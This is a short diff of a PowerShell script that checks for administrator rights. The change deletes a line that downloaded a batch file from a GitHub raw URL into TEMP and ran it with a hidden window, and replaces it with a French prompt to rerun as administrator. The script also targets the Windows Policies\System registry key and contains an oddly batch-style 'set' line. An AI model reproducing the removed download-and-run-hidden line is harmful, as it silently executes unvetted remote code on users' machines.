@@ -1,7 +1,9 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    iwr -useb raw.githubusercontent.com/sombrant/windows-opti/refs/heads/main/script.bat -o $env:TEMP\x.bat; saps $env:TEMP\x.bat -WindowStyle Hidden
+    Write-Host "Ce script doit être exécuté avec les privilèges administrateur. Relancez-le en tant qu'administrateur." -ForegroundColor Red
+    pause
+    exit 
 } else {
     set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
     $registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
